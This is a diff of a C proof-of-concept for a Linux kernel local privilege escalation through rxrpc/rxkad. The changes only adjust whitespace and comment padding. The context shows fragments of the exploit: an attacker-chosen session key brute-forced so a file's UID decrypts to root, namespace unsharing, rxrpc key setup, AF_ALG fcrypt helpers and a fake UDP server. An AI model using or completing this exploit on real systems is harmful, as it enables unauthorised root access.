@@ -445,6 +445,7 @@ struct rxkad_challenge {
 /* Attacker-chosen 8-byte session key used for the rxkad token.
  * Mutable because the LPE brute-force iterates over keys looking for
  * one that decrypts the file's UID field to a "0:" prefix. */
+
 static uint8_t SESSION_KEY[8] = {
 	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
 };
@@ -454,7 +455,7 @@ static uint8_t SESSION_KEY[8] = {
 #define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)
 
 /* =================================================================== */
-/* unshare + map setup                                                  */
+/* unshare + map setup                                                 */
 /* =================================================================== */
 
 static int write_file(const char *path, const char *fmt, ...)
@@ -504,7 +505,7 @@ static int do_unshare_userns_netns(void)
 }
 
 /* =================================================================== */
-/* rxrpc key (rxkad v1 token with attacker session key)                 */
+/* rxrpc key (rxkad v1 token with attacker session key)                */
 /* =================================================================== */
 
 static long key_add(const char *type, const char *desc,
@@ -518,7 +519,7 @@ static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
 	uint8_t *p = out;
 	uint32_t now = (uint32_t)time(NULL);
 	uint32_t expires = now + 86400;
-	*(uint32_t *)p = htonl(0); p += 4;   /* flags */
+	*(uint32_t *)p = htonl(0); p += 4;    /* flags */
 	const char *cell = "evil";
 	uint32_t clen = strlen(cell);
 	*(uint32_t *)p = htonl(clen); p += 4;
@@ -553,7 +554,7 @@ static long add_rxrpc_key(const char *desc)
 }
 
 /* =================================================================== */
-/* AF_ALG pcbc(fcrypt) helpers                                          */
+/* AF_ALG pcbc(fcrypt) helpers                                         */
 /* =================================================================== */
 
 static int alg_open_pcbc_fcrypt(const uint8_t key[8])
@@ -664,7 +665,7 @@ static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
 }
 
 /* =================================================================== */
-/* AF_RXRPC client                                                      */
+/* AF_RXRPC client                                                     */
 /* =================================================================== */
 
 static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
@@ -744,7 +745,7 @@ static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
 }
 
 /* =================================================================== */
-/* fake-server (plain UDP)                                              */
+/* fake-server (plain UDP)                                             */
 /* =================================================================== */
 
 static int setup_udp_server(uint16_t port)
@@ -776,7 +777,7 @@ static ssize_t udp_recv_to(int s, void *buf, size_t cap,
 }
 
 /* =================================================================== */
-/* main PoC                                                             */
+/* main PoC                                                            */
 /* =================================================================== */
 
 static int trigger_seq = 0;
